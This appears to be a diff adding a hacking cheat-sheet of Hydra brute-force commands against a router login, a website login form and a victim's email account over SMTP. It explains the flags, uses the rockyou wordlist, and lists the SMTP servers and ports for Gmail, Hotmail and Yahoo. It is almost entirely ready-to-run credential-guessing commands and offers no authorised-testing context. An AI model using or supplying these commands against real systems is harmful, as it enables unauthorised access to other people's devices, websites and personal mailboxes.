@@ -1,0 +1,45 @@
+ Attack Router :
+ ---------------
+     * hydra -l admin -P pass.txt 192.168.0.1 http-get -m / -V
+		 >> "-l" = username, "-P" = password file then router ip 
+         >> "http-get" mean it's a get request.
+		 >> pass.txt == Password file
+ 
+
+ Attack webside :
+ ----------------
+     * hydra -L user.txt -P pass.txt <server ip> http-post-form "<rest login address>:username=^USER^&password=^PASS^
+       &Login=Login:<Error massage>" -V
+ 
+      # <server ip>              = Enter server ip address
+      # <rest login address>     = suppose login address is "facebook.com/login".Here "/login" is <rest login address>
+      # "username" & "password"  = from username tag get the name field and same for password and also get the url.
+      # <Error message>          = Enter error when we enter wrong username or password
+      # http-post-form           = This is http post request. We also can spacify "http-get-form"
+ 
+
+ Attack Mail server:
+ -------------------
+     * hydra smtp.victimsemailserver.com smtp -l victimsaccountname -P ‘/root/Desktop/rockyou.txt’ -s portnumber -S -v -V
+		>> The SMTP server (For example, smtp.gmail.com if the victim is a Gmail user) 
+		>> -s 465 Port 465 stands for SMTPS which is SSL encryption that is started automatically.
+		>> -S = SSL encript	
+		
+ 
+     Some other mail serve :
+     ------------------------
+         gmail       :   server: smtp.gmail.com
+         port        :   465
+         hotmail     :   server: smtp.live.com
+         port        :   587
+         yahoo       :   server: smtp.mail.yahoo.com
+         port        :   587
+
+
+
+
+
+
+
+
+
